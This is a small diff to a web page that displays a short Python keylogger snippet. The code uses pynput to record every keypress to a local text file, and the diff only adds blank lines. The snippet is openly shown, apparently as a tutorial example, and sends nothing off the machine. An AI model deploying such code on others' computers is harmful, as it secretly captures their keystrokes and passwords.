@@ -25,6 +25,7 @@
    <pre width="450" height="350">
     <code width="450" height="350"> 
    from pynput import keyboard
+     
 def keyPressed(key):
     print(str(key))
     with open("keyfule.txt", 'a') as logKey:
@@ -37,6 +38,7 @@ def keyPressed(key):
             logKey.write("\n")
         elif key == keyboard.Key.space:
             logKey.write(' ')
+            
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
